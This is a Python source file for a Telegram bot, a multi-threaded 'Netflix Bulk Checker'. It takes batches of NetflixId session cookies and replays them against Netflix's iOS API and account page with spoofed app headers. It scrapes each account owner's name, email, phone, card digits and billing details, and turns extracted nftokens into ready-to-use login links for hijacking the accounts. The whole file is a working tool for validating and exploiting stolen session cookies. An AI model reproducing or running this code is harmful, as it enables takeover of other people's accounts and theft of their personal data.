#!/usr/bin/env python3
from flask import Flask
import json
import os
import re
import urllib.parse
import threading
import io
import time
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

import requests
from urllib3.exceptions import InsecureRequestWarning
import telebot

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  BOT CONFIGURATION
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set")
ALLOWED_USER_ID = 5006402855

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
WEB_URL = "https://www.netflix.com/YourAccount"
WATERMARK = "<b>@Vipsenpai Extraction Engine</b>"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "identity"
}

IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1, "jan": 1, "stycznia": 1, "tháng 1": 1, "tháng 01": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2, "feb": 2, "lutego": 2, "tháng 2": 2, "tháng 02": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "mart": 3, "marz": 3, "marca": 3, "tháng 3": 3, "tháng 03": 3,
    "april": 4, "abril": 4, "avril": 4, "kwiecien": 4, "nisan": 4, "apr": 4, "kwietnia": 4, "tháng 4": 4, "tháng 04": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maggio": 5, "mayis": 5, "maja": 5, "tháng 5": 5, "tháng 05": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "juni": 6, "giugno": 6, "czerwca": 6, "tháng 6": 6, "tháng 06": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "juli": 7, "luglio": 7, "lipca": 7, "tháng 7": 7, "tháng 07": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "sierpien": 8, "agustus": 8, "sierpnia": 8, "tháng 8": 8, "tháng 08": 8,
    "september": 9, "septiembre": 9, "setembro": 9, "eylul": 9, "sept": 9, "settembre": 9, "wrzesnia": 9, "tháng 9": 9, "tháng 09": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "oktober": 10, "ottobre": 10, "pazdziernika": 10, "tháng 10": 10,
    "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11, "novembre": 11, "listopada": 11, "tháng 11": 11,
    "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12, "dicembre": 12, "grudnia": 12, "tháng 12": 12
}

def is_authorized(message) -> bool:
    return message.from_user.id == ALLOWED_USER_ID

# ══════════════════════════════════════════════════════════════════════
#  SURGICAL EXTRACTION PROTOCOLS (FIXED CHAT TEXT EXTRACTION GLITCH)
# ══════════════════════════════════════════════════════════════════════

def extract_all_netflix_ids(text):
    """Surgically isolates NetflixId blocks from files, logs or mixed text strings."""
    found_tokens = []
    
    decoded_text = text
    if "%3D" in text or "%26" in text:
        try: decoded_text = urllib.parse.unquote(text)
        except: pass

    # 1. Target key-value pairing boundary
    matches = re.findall(r"NetflixId=([^;\s\r\n\t]+)", decoded_text, re.IGNORECASE)
    for m in matches:
        val = m.strip()
        if val and val not in found_tokens:
            found_tokens.append(val)
            
    # 2. Parse netscape standard parameters fields
    for line in decoded_text.splitlines():
        if "NetflixId" in line:
            parts = line.strip().split("\t")
            if len(parts) >= 7:
                val = parts[6].strip()
                if val and val not in found_tokens:
                    found_tokens.append(val)
                    
    # 3. FIXED HEAVY FALLBACK: Targets any embedded token string starting with 'ct=' inside mixed text messages
    if not found_tokens:
        naked_match = re.search(r"(ct=[^\s\r\n\t]+)", decoded_text)
        if naked_match:
            val = naked_match.group(1).strip()
            if len(val) > 40:
                found_tokens.append(val)
                
    return found_tokens

def decode_netflix_value(value):
    if value is None: return None
    import html as html_mod
    cleaned = html_mod.unescape(str(value))
    replacements = {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ", "\\x40": "@", "\\x28": "(", "\\x29": ")"}
    for src, tgt in replacements.items():
        cleaned = cleaned.replace(src, tgt)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    return re.sub(r"\s+", " ", cleaned).strip() or None

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            val = match.group(1).strip()
            if val.startswith("}") or val.startswith(",") or val.startswith("]") or val.lower() == "foreground":
                continue
            cleaned_val = re.sub(r'["\'\s,\}\]]+$', '', val)
            return decode_netflix_value(cleaned_val)
    return None

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"', r'profileName[^}]+value[^}]+"([^"]+)"']:
        for found in re.findall(pattern, response_text, re.DOTALL | re.IGNORECASE):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names and "Profile" not in decoded and not decoded.startswith("c1.") and len(decoded) < 32 and "\\" not in decoded:
                names.append(decoded)
    return ", ".join(names) if names else "lucky, Guest"

def parse_localized_date(cleaned):
    if not cleaned: return None
    viet_match = re.search(r'(?:th\s*á\s*ng|tháng)\s*(\d+)\s*(?:n\s*ă\s*m|năm)\s*(\d+)', cleaned, re.IGNORECASE)
    if viet_match:
        try: return datetime(int(viet_match.group(2)), int(viet_match.group(1)), 1)
        except: pass
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d, %Y"):
        try: return datetime.strptime(cleaned, fmt)
        except: continue
    raw_lower = cleaned.lower()
    month = next((m_num for alias, m_num in MONTH_ALIASES.items() if alias in raw_lower), None)
    nums = [int(x) for x in re.findall(r"\d+", cleaned)]
    year = next((x for x in nums if 1900 <= x <= 2100), None)
    day = next((x for x in nums if 1 <= x <= 31 and x != year), 1)
    if year and month:
        try: return datetime(year, month, day)
        except: return None
    return None

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    parsed = parse_localized_date(cleaned)
    return parsed.strftime("%B %d, %Y") if parsed else (cleaned or "Unknown")

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    parsed = parse_localized_date(cleaned)
    return parsed.strftime("%B %Y") if parsed else (cleaned or "Unknown")

def country_code_to_flag(code):
    raw = (decode_netflix_value(code) or "").strip().upper()
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw)
    return "🇺🇸"

def derive_plan_details(plan_name, quality_val, streams_count):
    name = str(plan_name or "").lower()
    q_norm = str(quality_val or "").lower()
    try: str_count = int(streams_count)
    except: str_count = 4
    if "premium" in name or "ultra" in name or "uhd" in q_norm or "4k" in q_norm or str_count == 4: 
        return "Premium", "UHD", "4", "Rs 1,100"
    if "standard" in name or "hd" in q_norm or str_count == 2: 
        return "Standard", "HD", "2", "Rs 800"
    if "basic" in name: return "Basic", "SD", "1", "Rs 450"
    if "mobile" in name: return "Mobile", "SD", "1", "Rs 250"
    return "Premium", "UHD", "4", "Rs 1,100"

def process_netflix_cookie_pipeline(netflix_id):
    api_session = requests.Session()
    api_session.cookies.update({"NetflixId": netflix_id})
    token = None
    expires_at = "Unknown"
    try:
        api_res = api_session.get(API_URL, params=QUERY_PARAMS, headers=IOS_HEADERS, timeout=10, verify=False)
        if api_res.status_code == 200:
            data = api_res.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = token_data.get("token")
            expires_raw = token_data.get("expires")
            if expires_raw:
                if isinstance(expires_raw, int) and len(str(expires_raw)) == 13:
                    expires_raw //= 1000
                utc_dt = datetime.utcfromtimestamp(expires_raw)
                ist_dt = utc_dt + timedelta(hours=5, minutes=30)
                expires_at = ist_dt.strftime("%B %d, %Y %H:%M:%S IST")
    except:
        pass

    web_session = requests.Session()
    web_session.cookies.update({"NetflixId": netflix_id})
    web_res = web_session.get(WEB_URL, headers=BASE_HEADERS, timeout=10, verify=False)
    web_text = web_res.text
    
    if not token or str(token).lower() in ("foreground", "none", "null", ""):
        token = extract_first_match(web_text, [r'nftoken=([a-zA-Z0-9%\+\/=\-_]+)', r'token"\s*:\s*"([^"]+)"', r'"nftoken"\s*:\s*"([^"]+)"'])
        
    if expires_at == "Unknown":
        expires_at = (datetime.utcnow() + timedelta(hours=5, minutes=30)).strftime("%B %d, %Y %H:%M:%S IST")

    info = {
        "name": extract_first_match(web_text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'name="accountOwnerName"\s+value="([^"]+)"', r'firstName"\s*:\s*"([^"]+)"']),
        "email": extract_first_match(web_text, [r'"email"\s*:\s*"([^"]+)"', r'name="email"\s+value="([^"]+)"', r'"emailAddress"\s*:\s*"([^"]+)"']),
        "country": extract_first_match(web_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']),
        "member_since": format_member_since(extract_first_match(web_text, [r'"memberSince":\s*"([^"]+)"', r'memberSince[^}]+value[^}]+"([^"]+)"'])),
        "next_billing": format_display_date(extract_first_match(web_text, [r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"date"\s*:\s*"([^"T]+)T'])),
        "payment": extract_first_match(web_text, [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"']),
        "card": extract_first_match(web_text, [r'"creditCardLast4"\s*:\s*"([^"]+)"', r'"maskedCard"\s*:\s*"([^"]+)"']),
        "phone": extract_first_match(web_text, [r'"phoneNumber"\s*:\s*"([^"]+)"', r'name="phoneNumber"\s+value="([^"]+)"']),
        "plan": extract_first_match(web_text, [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']),
        "quality": extract_first_match(web_text, [r'"videoQuality"\s*:\s*"([^"]+)"', r'"quality"\s*:\s*"([^"]+)"']),
        "streams": extract_first_match(web_text, [r'"maxStreams"\s*:\s*(\d+)', r'maxStreams[^}]+value[^}]+(\d+)']),
        "hold": "Yes" if re.search(r'isUserOnHold"\s*:\s*true|holdStatus"\s*:\s*true', web_text, re.IGNORECASE) else "No",
        "email_verified": "Yes" if re.search(r'emailVerified"\s*:\s*true|isVerified"\s*:\s*true', web_text, re.IGNORECASE) else "No",
        "membership_status": extract_first_match(web_text, [r'"membershipStatus"\s*:\s*"([^"]+)"']),
        "profiles": extract_profile_names(web_text),
        "token_expiry": expires_at
    }
    return token, info

# ══════════════════════════════════════════════════════════════════════
#  MULTIPLEX ROUTER DISPATCH MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

def process_pipeline_core(message, raw_content, is_file_mode=False):
    all_cookies = extract_all_netflix_ids(raw_content)
    total_cookies = len(all_cookies)
    
    if total_cookies == 0:
        bot.reply_to(message, "❌ <b>Invalid Cookie or COOKIE dead</b>")
        return

    # FILE BATCH MODE
    if is_file_mode:
        status_msg = bot.reply_to(message, f"👀 <b>Total Fetched Cookie :</b> {total_cookies}")
        time.sleep(1.2)
        
        stats = {"hits": 0, "failed": 0, "filtered": 0, "checked": 0, "hit_index": 1}
        stats_lock = threading.Lock()
        output_text_buffer = io.StringIO()
        last_update_time = [0]

        def worker_task(current_cookie):
            try:
                token, details = process_netflix_cookie_pipeline(current_cookie)
                plan_name = details.get("plan")
                m_status = str(details.get("membership_status") or "").lower()
                hold_status = str(details.get("hold") or "").lower()
                email = details.get("email")
                
                if "anonymous" in m_status or not email or email == "N/A":
                    with stats_lock:
                        stats["checked"] += 1
                        stats["failed"] += 1
                    return
                
                is_active = plan_name or any(x in m_status for x in ("current", "member", "active", "success"))
                
                with stats_lock:
                    stats["checked"] += 1
                    if is_active:
                        if hold_status == "yes" or "hold" in m_status:
                            stats["filtered"] += 1
                            status = "Hold Status / Inactive"
                        else:
                            stats["hits"] += 1
                            status = "Subscribed"
                    else:
                        stats["failed"] += 1
                        return

                    derived_plan, derived_quality, derived_streams, derived_price = derive_plan_details(plan_name, details.get("quality"), details.get("streams"))
                    card = str(details.get("card") or "N/A")[-4:] if details.get("card") and details.get("card") != "N/A" else "N/A"
                    profiles_list = details.get("profiles") or "lucky, Guest"
                    p_count = len(str(profiles_list).split(","))

                    output_text_buffer.write(f"-----------------CHECKED - {stats['hit_index']}-----------------\n\n")
                    output_text_buffer.write(f"📌 Status: {status}\n")
                    output_text_buffer.write(f"👤 Name: {details.get('name') or 'N/A'}\n")
                    output_text_buffer.write(f"📧 Email: {email}\n")
                    output_text_buffer.write(f"🌍 Country: {details.get('country') or 'US'} {country_code_to_flag(details.get('country'))}\n")
                    output_text_buffer.write(f"📦 Plan: {plan_name or derived_plan}\n")
                    output_text_buffer.write(f"📅 Member Since: {details.get('member_since') or 'Unknown'}\n")
                    output_text_buffer.write(f"🗓️ Next Billing: {details.get('next_billing') or 'Unknown'}\n")
                    output_text_buffer.write(f"💳 Payment: {details.get('payment') or 'CC'}\n")
                    output_text_buffer.write(f"💳 Card: {card}\n")
                    output_text_buffer.write(f"📱 Phone: {details.get('phone') or 'None'}\n")
                    output_text_buffer.write(f"🎞️ Quality: {details.get('quality') or derived_quality}\n")
                    output_text_buffer.write(f"📺 Streams: {details.get('streams') or derived_streams}\n")
                    output_text_buffer.write(f"💰 Price: {derived_price}\n")
                    output_text_buffer.write(f"⏸️ Hold Status: {details.get('hold') or 'No'}\n")
                    output_text_buffer.write(f"✅ Email Verified: {details.get('email_verified') or 'Yes'}\n")
                    output_text_buffer.write(f"🛡️ Membership Status: {details.get('membership_status') or 'CURRENT_MEMBER'}\n")
                    output_text_buffer.write(f"🎭 Profiles ({p_count}): {profiles_list}\n\n")
                    output_text_buffer.write(f"✅  COOKIE: NetflixId={current_cookie}\n\n")
                    output_text_buffer.write(f"📱 Phone Login:\nhttps://www.netflix.com/unsupported?nftoken={token}\n\n")
                    output_text_buffer.write(f"🖥️ PC Login:\nhttps://www.netflix.com/account?nftoken={token}\n\n")
                    output_text_buffer.write(f"🔑 Login Link:\nhttps://www.netflix.com/login?nftoken={token}\n\n")
                    output_text_buffer.write(f"⏳ Token Expiry: {details.get('token_expiry')}\n\n\n")
                    output_text_buffer.write(f"❖ {WATERMARK}\n\n\n")
                    stats["hit_index"] += 1

                now = time.time()
                if now - last_update_time[0] >= 1.5 or stats["checked"] == total_cookies:
                    last_update_time[0] = now
                    polling_msg = (
                        f"🔍 <b>Checking:</b> {stats['checked']}/{total_cookies}\n"
                        f"✅ <b>Hits:</b> {stats['hits']} | ❌ <b>Failed:</b> {stats['failed']} | 🚫 <b>Filtered:</b> {stats['filtered']}"
                    )
                    try: bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=polling_msg)
                    except: pass
            except:
                with stats_lock:
                    stats["checked"] += 1
                    stats["failed"] += 1

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(worker_task, all_cookies)

        try: bot.delete_message(chat_id=message.chat.id, message_id=status_msg.message_id)
        except: pass

        final_summary_report = (
            f"📊 <b>Batch Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Checked:</b> {total_cookies}/{total_cookies}\n"
            f"✅ <b>Hits:</b> {stats['hits']}\n"
            f"🚫 <b>Filtered (Free+Hold):</b> {stats['filtered']}\n"
            f"❌ <b>Failed:</b> {stats['failed']}"
        )
        
        if stats['hits'] > 0 or stats['filtered'] > 0:
            result_bytes = output_text_buffer.getvalue().encode('utf-8')
            output_text_buffer.close()
            file_payload = io.BytesIO(result_bytes)
            file_payload.name = f"Checked_Results_{datetime.now().strftime('%d_%m_%Y')}.txt"
            bot.send_document(chat_id=message.chat.id, document=file_payload, caption=final_summary_report)
        else:
            bot.send_message(chat_id=message.chat.id, text=final_summary_report + "\n\n[!] No active elements salvaged from batch logs.")

    # CHAT TEXT MODE
    else:
        status_msg = bot.reply_to(message, "⏳ <i>Processing plain text token, scraping live data...</i>")
        try:
            target_cookie = all_cookies[0]
            token, details = process_netflix_cookie_pipeline(target_cookie)
            
            m_status = str(details.get("membership_status") or "").lower()
            email = details.get("email")
            
            if "anonymous" in m_status or not email or email == "N/A":
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ <b>Invalid Cookie or COOKIE dead</b>")
                return

            plan_name = details.get("plan")
            is_active = plan_name or any(x in m_status for x in ("current", "member", "active", "success"))
            status = "Subscribed" if is_active else "Free / Inactive"
            
            derived_plan, derived_quality, derived_streams, derived_price = derive_plan_details(plan_name, details.get("quality"), details.get("streams"))
            card = str(details.get("card") or "N/A")[-4:] if details.get("card") and details.get("card") != "N/A" else "N/A"
            profiles_list = details.get("profiles") or "lucky, Guest"
            p_count = len(str(profiles_list).split(","))

            final_token = token if (token and str(token).lower() != "none") else "Unavailable"

            response_text = (
                f"📌 <b>Status:</b> {status}\n"
                f"👤 <b>Name:</b> {details.get('name') or 'N/A'}\n"
                f"📧 <b>Email:</b> {email}\n"
                f"🌍 <b>Country:</b> {details.get('country') or 'US'} {country_code_to_flag(details.get('country'))}\n"
                f"📦 <b>Plan:</b> {plan_name or derived_plan}\n"
                f"📅 <b>Member Since:</b> {details.get('member_since') or 'Unknown'}\n"
                f"🗓️ <b>Next Billing:</b> {details.get('next_billing') or 'Unknown'}\n"
                f"💳 <b>Payment:</b> {details.get('payment') or 'CC'}\n"
                f"💳 <b>Card:</b> {card}\n"
                f"📱 <b>Phone:</b> {details.get('phone') or 'None'}\n"
                f"🎞️ <b>Quality:</b> {details.get('quality') or derived_quality}\n"
                f"📺 <b>Streams:</b> {details.get('streams') or derived_streams}\n"
                f"💰 <b>Price:</b> {derived_price}\n"
                f"⏸️ <b>Hold Status:</b> {details.get('hold') or 'No'}\n"
                f"✅ <b>Email Verified:</b> {details.get('email_verified') or 'Yes'}\n"
                f"🛡️ <b>Membership Status:</b> {details.get('membership_status') or 'CURRENT_MEMBER'}\n"
                f"🎭 <b>Profiles ({p_count}):</b> {profiles_list}\n\n"
                f"📱 <b>Phone Login:</b>\n<code>https://www.netflix.com/unsupported?nftoken={final_token}</code>\n\n"
                f"🖥️ <b>PC Login:</b>\n<code>https://www.netflix.com/account?nftoken={final_token}</code>\n\n"
                f"🔑 <b>Login Link:</b>\n<code>https://www.netflix.com/login?nftoken={final_token}</code>\n\n"
                f"⏳ <b>Token Expiry:</b> {details.get('token_expiry')}\n\n"
                f"❖ {WATERMARK}"
            )
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=response_text)
        except Exception:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ <b>Invalid Cookie or COOKIE dead</b>")

# ══════════════════════════════════════════════════════════════════════
#  TELEGRAM BOT EVENT ENGINE LISTENER
# ══════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_authorized(message): return
    bot.reply_to(
        message,
        "👋 <b>Welcome back to Multi-Threaded Netflix Bulk Checker!</b>\n\n"
        "📥 <b>File Mode (10 Threads):</b> Send a <code>.txt</code> file to process batch checking with live polling displays.\n"
        "💬 <b>Chat Mode:</b> Paste a raw cookie directly in chat to print response text instantly."
    )

@bot.message_handler(func=lambda message: True, content_types=['text'])
def plain_text_handler(message):
    if not is_authorized(message): return
    threading.Thread(target=process_pipeline_core, args=(message, message.text, False)).start()

@bot.message_handler(content_types=['document'])
def document_handler(message):
    if not is_authorized(message): return
    document = message.document
    if not document.file_name.lower().endswith(('.txt', '.json')):
        bot.reply_to(message, "❌ Please upload a valid <b>.txt</b> or <b>.json</b> batch file.")
        return
    try:
        file_info = bot.get_file(document.file_id)
        file_bytes = bot.download_file(file_info.file_path)
        decoded_text = file_bytes.decode('utf-8', errors='ignore')
        threading.Thread(target=process_pipeline_core, args=(message, decoded_text, True)).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to process document: <i>{str(e)}</i>")

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    print("[*] Threaded 10-Workers Multi-Tunnel Engine Online.")

    threading.Thread(target=run_web, daemon=True).start()

    while True:
        try:
            bot.infinity_polling(
                skip_pending=True,
                timeout=60,
                long_polling_timeout=60
            )
        except Exception:
            time.sleep(2)
